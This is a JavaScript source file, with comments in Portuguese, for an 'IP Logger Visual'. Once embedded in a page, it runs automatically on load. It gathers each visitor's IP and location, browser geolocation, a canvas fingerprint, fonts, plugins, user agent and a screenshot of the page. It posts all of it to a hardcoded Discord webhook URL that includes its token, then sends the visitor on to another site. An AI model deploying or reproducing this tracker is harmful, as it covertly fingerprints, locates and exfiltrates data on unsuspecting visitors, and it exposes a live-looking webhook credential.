/*  IP Logger Visual – client-side
    - Sem permissões (não usa câmera, tela, microfone)
    - Canvas fingerprint + screenshot da própria página
    - Envia via fetch para webhook Discord ou Google Apps Script
*/

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1434634211775746129/wLEZ1Ci4tvHy5V9x-OI5-359fM9ypOxbWC2zzL_rAXawq10ZVpHMyE7rVGHXsecVKQh9'; // ou GAS

/* ---------- Helpers ---------- */
const hash = async (str) => {
  const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(str));
  return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2,'0')).join('');
};

/* ---------- Coletores ---------- */
const getIP = () =>
  fetch('https://ipapi.co/json').then(r => r.json()).catch(() => ({}));

const getGeo = () =>
  new Promise(resolve => {
    if (!navigator.geolocation) return resolve({});
    navigator.geolocation.getCurrentPosition(
      p => resolve({lat: p.coords.latitude, lon: p.coords.longitude}),
      () => resolve({}), {timeout: 1500}
    );
  });

const getCanvasFingerprint = async () => {
  const canvas = document.createElement('canvas');
  canvas.width = 220; canvas.height = 30;
  const ctx = canvas.getContext('2d');
  ctx.textBaseline = 'top';
  ctx.font = '14px Arial';
  ctx.fillStyle = '#f60';
  ctx.fillRect(2, 2, 20, 15);
  ctx.fillStyle = '#069';
  ctx.fillText('Canvas fp 🎨', 25, 5);
  // Adiciona linhas para aumentar entropia
  ctx.strokeStyle = 'rgba(102, 204, 0, 0.7)';
  ctx.arc(60, 10, 10, 0, Math.PI * 2, true);
  ctx.stroke();
  const data = canvas.toDataURL();
  return {hash: await hash(data), data};
};

const getScreenshot = async () => {
  // Captura apenas o DOM visível desta página
  const canvas = await html2canvas(document.body, {scale: 0.5});
  const dataURL = canvas.toDataURL('image/jpeg', 0.5);
  // Limita a <100 kB
  if (dataURL.length > 100_000) {
    return canvas.toDataURL('image/jpeg', 0.3);
  }
  return dataURL;
};

const getFonts = () => {
  // Testa fontes comuns via canvas
  const base = 'mmmmmmmmmmlli';
  const canvas = document.createElement('canvas').getContext('2d');
  canvas.font = '72px monospace';
  const w0 = canvas.measureText(base).width;
  const fonts = [
    'Arial', 'Verdana', 'Times', 'Courier', 'Georgia', 'Comic Sans MS',
    'Impact', 'Trebuchet MS', 'Helvetica', 'monospace'
  ];
  return fonts.filter(f => {
    canvas.font = `72px "${f}", monospace`;
    return canvas.measureText(base).width !== w0;
  });
};

/* ---------- Monta payload ---------- */
async function collect() {
  const [ip, geo, canvas, screenshot] = await Promise.all([
    getIP(), getGeo(), getCanvasFingerprint(), getScreenshot()
  ]);

  const payload = {
    ip: ip.ip,
    city: ip.city,
    region: ip.region,
    country: ip.country,
    lat: geo.lat,
    lon: geo.lon,
    ua: navigator.userAgent,
    screen: `${screen.width}x${screen.height}`,
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    referrer: document.referrer || 'direct',
    plugins: [...navigator.plugins].map(p => p.name),
    fonts: getFonts(),
    colorScheme: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light',
    canvasHash: canvas.hash,
    screenshot, // base64
    ts: Date.now()
  };

  return payload;
}

/* ---------- Envio ---------- */
async function send(payload) {
  await fetch(WEBHOOK_URL, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({content: '```json\n' + JSON.stringify(payload, null, 2) + '\n```'})
  }).catch(console.error);
}

/* ---------- Opt-out ---------- */
document.getElementById('optOut').onclick = () => {
  document.cookie = 'optout=1; max-age=31536000; path=/';
  location.href = 'https://example.com'; // redireciona para fora
};

/* ---------- Execução ---------- */
(async () => {
  if (document.cookie.includes('optout=1')) return;
  const data = await collect();
  await send(data);
  // Redireciona após 2 s
  setTimeout(() => location.href = 'https://example.com', 2000);
})();